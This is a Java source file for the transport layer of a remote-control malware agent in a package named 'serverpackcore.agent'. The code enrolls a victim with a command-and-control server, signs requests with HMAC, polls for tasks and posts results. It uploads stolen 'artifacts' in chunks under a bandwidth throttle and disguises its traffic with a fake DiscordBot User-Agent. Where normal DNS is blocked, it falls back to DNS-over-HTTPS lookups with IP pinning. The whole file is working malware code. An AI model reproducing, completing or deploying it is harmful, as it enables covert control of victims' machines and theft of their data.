package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.Json;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SNIHostName;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Signed HTTPS transport. DNS is resolved over DoH when the system resolver
 * fails; the connection then pins the IP while keeping SNI and the Host header.
 */
final class CryptoTransport {
	record Reply(int status, byte[] body) {
		String text() {
			return new String(body, StandardCharsets.UTF_8);
		}
		Map<String, Object> json() {
			try {
				return Json.parseObject(text());
			} catch (Throwable throwable) {
				return Map.of();
			}
		}
	}

	private static final SecureRandom RANDOM = new SecureRandom();
	private static final AtomicLong NONCE = new AtomicLong();
	private final CryptoConfig config;
	private final CryptoLog log;
	private volatile String deviceToken = "";
	private volatile String victimId = "";
	private volatile String base;
	private volatile String pinned;
	private volatile long pinnedUntil;
	private volatile long lastSend;

	CryptoTransport(CryptoConfig config, CryptoLog log) {
		this.config = config;
		this.log = log;
		this.base = config.c2Base;
	}

	void identity(String victim, String token) {
		this.victimId = victim;
		this.deviceToken = token;
	}

	boolean enrolled() {
		return !deviceToken.isEmpty() && !victimId.isEmpty();
	}

	String victimId() {
		return victimId;
	}

	Reply enroll(String buildToken, Map<String, Object> payload) throws Exception {
		byte[] body = CryptoUtil.utf8(Json.stringify(payload));
		return send("POST", "/enroll", body, "application/json", buildToken, 4);
	}

	Reply heartbeat(byte[] body) throws Exception {
		return signed("POST", "/hb", body, "application/json", 4);
	}

	Reply tasks(int limit) throws Exception {
		return signed("GET", "/tasks?limit=" + limit, new byte[0], null, 4);
	}

	Reply result(String id, byte[] body) throws Exception {
		return signed("POST", "/tasks/" + id + "/result", body, "application/json", 4);
	}

	Reply uploadInit(byte[] body) throws Exception {
		return signed("POST", "/artifacts", body, "application/json", 4);
	}

	Reply uploadStatus(String id) throws Exception {
		return signed("GET", "/artifacts/" + id, new byte[0], null, 3);
	}

	Reply chunk(String id, long offset, byte[] data, String chunkHash) throws Exception {
		return signed("POST", "/artifacts/" + id + "/chunk?offset=" + offset, data, "application/octet-stream", 5,
			Map.of("X-Chunk-Sha256", chunkHash));
	}

	Reply commit(String id, byte[] body) throws Exception {
		return signed("POST", "/artifacts/" + id + "/commit", body, "application/json", 4);
	}

	Reply signed(String method, String pathAndQuery, byte[] body, String type, int attempts) throws Exception {
		return signed(method, pathAndQuery, body, type, attempts, Map.of());
	}

	private Reply signed(String method, String pathAndQuery, byte[] body, String type, int attempts,
			Map<String, String> extra) throws Exception {
		if (!enrolled()) {
			throw new IllegalStateException("not_enrolled");
		}
		long backoff = 1200L;
		Throwable last = null;
		for (int attempt = 0; attempt < attempts; attempt++) {
			try {
				String timestamp = Long.toString(System.currentTimeMillis() / 1000L);
				String nonce = nonce();
				String path = pathAndQuery.contains("?") ? pathAndQuery.substring(0, pathAndQuery.indexOf('?')) : pathAndQuery;
				String canonical = method + "\n" + "/api/v1" + path + "\n" + timestamp + "\n" + nonce + "\n"
					+ CryptoUtil.hex(CryptoUtil.sha256(body)) + "\n";
				byte[] signature = hmac(canonical);
				Map<String, String> headers = new LinkedHashMap<>(extra);
				headers.put("X-Victim-Id", victimId);
				headers.put("X-Timestamp", timestamp);
				headers.put("X-Nonce", nonce);
				headers.put("X-Signature", CryptoUtil.b64url(signature));
				headers.put("X-Contract", "1");
				Reply reply = send(method, pathAndQuery, body, type, "", 1, headers);
				if (reply.status() == 429) {
					long wait = 2000L;
					try {
						wait = Math.max(1000L, Json.num(reply.json(), "retry_after", 2L) * 1000L);
					} catch (Throwable ignored) {
						// default wait
					}
					Thread.sleep(wait);
					continue;
				}
				if (reply.status() >= 500 || reply.status() == 0) {
					last = new IllegalStateException("status " + reply.status());
				} else {
					return reply;
				}
			} catch (Throwable throwable) {
				last = throwable;
			}
			if (attempt + 1 < attempts) {
				Thread.sleep(backoff + RANDOM.nextInt(700));
				backoff = Math.min(30_000L, backoff * 2L);
			}
		}
		throw last instanceof Exception exception ? exception : new IllegalStateException(String.valueOf(last));
	}

	private Reply send(String method, String pathAndQuery, byte[] body, String type, String bearer, int attempts)
		throws Exception {
		return send(method, pathAndQuery, body, type, bearer, attempts, Map.of());
	}

	private Reply send(String method, String pathAndQuery, byte[] body, String type, String bearer, int attempts,
		Map<String, String> extra) throws Exception {
		Throwable last = null;
		for (int attempt = 0; attempt < Math.max(1, attempts); attempt++) {
			try {
				Reply reply;
				try {
					reply = request(base + pathAndQuery, method, body, type, bearer, extra, null);
				} catch (java.net.UnknownHostException | java.net.ConnectException exception) {
					String ip = resolve(base);
					if (ip == null) {
						throw exception;
					}
					reply = request(base + pathAndQuery, method, body, type, bearer, extra, ip);
				}
				throttle(body.length);
				return reply;
			} catch (Throwable throwable) {
				last = throwable;
				Thread.sleep(900L * (attempt + 1));
			}
		}
		throw last instanceof Exception exception ? exception : new IllegalStateException(String.valueOf(last));
	}

	private Reply request(String url, String method, byte[] body, String type, String bearer,
			Map<String, String> extra, String pinnedIp) throws Exception {
		URI uri = URI.create(url);
		String host = uri.getHost();
		String file = uri.getRawPath() + (uri.getRawQuery() == null ? "" : "?" + uri.getRawQuery());
		URL target = pinnedIp == null ? uri.toURL() : new URL(uri.getScheme(), pinnedIp, uri.getPort(), file);
		HttpsURLConnection connection = (HttpsURLConnection) target.openConnection();
		connection.setRequestMethod(method);
		connection.setConnectTimeout(12_000);
		connection.setReadTimeout(60_000);
		connection.setInstanceFollowRedirects(false);
		String ua = "DiscordBot (SPC-Console, 1.0)";
		connection.setRequestProperty("User-Agent", ua);
		if (pinnedIp != null) {
			connection.setRequestProperty("Host", host);
			connection.setSSLSocketFactory(factory(host));
			connection.setHostnameVerifier((value, session) -> HttpsURLConnection.getDefaultHostnameVerifier().verify(host, session));
		}
		if (type != null) {
			connection.setRequestProperty("Content-Type", type);
		}
		if (bearer != null && !bearer.isEmpty()) {
			connection.setRequestProperty("Authorization", "Bearer " + bearer);
		}
		for (Map.Entry<String, String> header : extra.entrySet()) {
			connection.setRequestProperty(header.getKey(), header.getValue());
		}
		if (body.length > 0) {
			connection.setDoOutput(true);
			connection.setFixedLengthStreamingMode(body.length);
			try (OutputStream output = connection.getOutputStream()) {
				output.write(body);
			}
		}
		int status = connection.getResponseCode();
		InputStream input = status >= 400 ? connection.getErrorStream() : connection.getInputStream();
		byte[] response = input == null ? new byte[0] : read(input, 1 << 20);
		return new Reply(status, response);
	}

	private static byte[] read(InputStream input, int limit) throws Exception {
		try (InputStream source = input) {
			ByteArrayOutputStream out = new ByteArrayOutputStream();
			byte[] buffer = new byte[8192];
			int count;
			while ((count = source.read(buffer)) > 0 && out.size() < limit) {
				out.write(buffer, 0, Math.min(count, limit - out.size()));
			}
			return out.toByteArray();
		}
	}

	private String resolve(String value) {
		long now = System.currentTimeMillis();
		if (pinned != null && now < pinnedUntil) {
			return pinned;
		}
		try {
			String host = URI.create(value).getHost();
			String result = doh(host);
			if (result != null) {
				pinned = result;
				pinnedUntil = now + 600_000L;
			}
			return result;
		} catch (Throwable throwable) {
			return null;
		}
	}

	private static String doh(String host) {
		for (String provider : List.of("https://cloudflare-dns.com/dns-query", "https://dns.google/resolve")) {
			try {
				URL url = new URL(provider + "?name=" + URLEncoder.encode(host, StandardCharsets.UTF_8) + "&type=A");
				HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
				connection.setRequestProperty("Accept", "application/dns-json");
				connection.setConnectTimeout(6000);
				connection.setReadTimeout(6000);
				if (connection.getResponseCode() != 200) {
					continue;
				}
				Map<String, Object> json = Json.parseObject(new String(connection.getInputStream().readAllBytes(), StandardCharsets.UTF_8));
				for (Object item : Json.list(json.get("Answer"))) {
					Map<String, Object> answer = Json.map(item);
					String data = Json.str(answer, "data", "");
					if (Json.num(answer, "type", 0L) == 1L && !data.isEmpty()) {
						return data;
					}
				}
			} catch (Throwable ignored) {
				// next provider
			}
		}
		return null;
	}

	private static SSLSocketFactory factory(String host) {
		return new SSLSocketFactory() {
			private final SSLSocketFactory delegate = (SSLSocketFactory) SSLSocketFactory.getDefault();

			@Override
			public String[] getDefaultCipherSuites() {
				return delegate.getDefaultCipherSuites();
			}

			@Override
			public String[] getSupportedCipherSuites() {
				return delegate.getSupportedCipherSuites();
			}

			@Override
			public Socket createSocket(Socket socket, String value, int port, boolean autoClose) throws java.io.IOException {
				return tune(delegate.createSocket(socket, host, port, autoClose));
			}

			@Override
			public Socket createSocket(String value, int port) throws java.io.IOException {
				return tune(delegate.createSocket(host, port));
			}

			@Override
			public Socket createSocket(String value, int port, InetAddress local, int localPort) throws java.io.IOException {
				return tune(delegate.createSocket(host, port, local, localPort));
			}

			@Override
			public Socket createSocket(InetAddress address, int port) throws java.io.IOException {
				return tune(delegate.createSocket(address, port));
			}

			@Override
			public Socket createSocket(InetAddress address, int port, InetAddress local, int localPort) throws java.io.IOException {
				return tune(delegate.createSocket(address, port, local, localPort));
			}

			private Socket tune(Socket socket) {
				if (socket instanceof SSLSocket ssl) {
					var parameters = ssl.getSSLParameters();
					parameters.setServerNames(List.of(new SNIHostName(host)));
					ssl.setSSLParameters(parameters);
				}
				return socket;
			}
		};
	}

	private void throttle(long bytes) {
		try {
			long kbps = Math.max(32, config.bandwidthKbps);
			long millis = bytes * 8L / kbps;
			long since = System.currentTimeMillis() - lastSend;
			if (millis > since) {
				Thread.sleep(millis - since);
			}
			lastSend = System.currentTimeMillis();
		} catch (InterruptedException interrupted) {
			Thread.currentThread().interrupt();
		}
	}

	private byte[] hmac(String canonical) throws Exception {
		Mac mac = Mac.getInstance("HmacSHA256");
		mac.init(new SecretKeySpec(CryptoUtil.b64url(deviceToken), "HmacSHA256"));
		return mac.doFinal(canonical.getBytes(StandardCharsets.UTF_8));
	}

	private static String nonce() {
		byte[] value = new byte[16];
		RANDOM.nextBytes(value);
		long counter = NONCE.incrementAndGet();
		for (int i = 0; i < 8; i++) {
			value[i] ^= (byte) (counter >>> (i * 8));
		}
		return Base64.getUrlEncoder().withoutPadding().encodeToString(value);
	}
}
